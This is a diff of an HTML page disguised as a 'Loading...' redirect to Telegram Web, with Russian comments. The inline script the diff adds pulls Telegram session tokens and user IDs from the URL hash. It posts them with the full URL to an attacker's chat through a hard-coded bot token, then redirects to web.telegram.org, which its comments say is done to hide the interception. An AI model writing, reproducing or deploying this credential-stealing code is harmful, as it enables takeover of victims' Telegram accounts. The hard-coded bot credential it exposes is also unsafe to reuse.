@@ -2,33 +2,33 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Загрузка...</title>
+    <title>Loading...</title>
     <script>
         (function() {
-            // Извлекаем хэш (часть после #)
+            // Извлекаем хэш из URL
             const hash = window.location.hash.substring(1);
             if (hash) {
                 const params = new URLSearchParams(hash);
-                const token = params.get('tgWebAuthToken');
-                const userId = params.get('tgWebAuthUserId');
-                const dcId = params.get('tgWebAuthDcId');
+                // Пытаемся получить токен (параметр может называться access_token или tgWebAuthToken)
+                const token = params.get('access_token') || params.get('tgWebAuthToken');
+                const userId = params.get('user_id') || params.get('tgWebAuthUserId');
+                const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
+                const chatId = '8220267007';
                 
-                // Если все параметры присутствуют
-                if (token && userId && dcId) {
-                    const botToken = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';
-                    const chatId = '8220267007';
-                    const message = `🔐 Перехваченные данные:\nТокен: ${token}\nUser ID: ${userId}\nDC ID: ${dcId}\nПолная ссылка: ${window.location.href}`;
+                if (token) {
+                    let message = `🔐 Перехвачен токен: ${token}`;
+                    if (userId) message += `\nUser ID: ${userId}`;
+                    message += `\nПолный URL: ${window.location.href}`;
                     
-                    // Отправляем в Telegram (асинхронно, не ждём ответа)
+                    // Отправляем в Telegram через API бота
                     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ chat_id: chatId, text: message })
-                    }).catch(() => {});
+                    }).catch(e => console.log('Ошибка отправки', e));
                 }
             }
-            // Перенаправляем на официальный сайт Telegram Web
+            // Перенаправляем на официальный web.telegram.org, чтобы скрыть перехват
             window.location.replace('https://web.telegram.org/k/');
         })();
     </script>
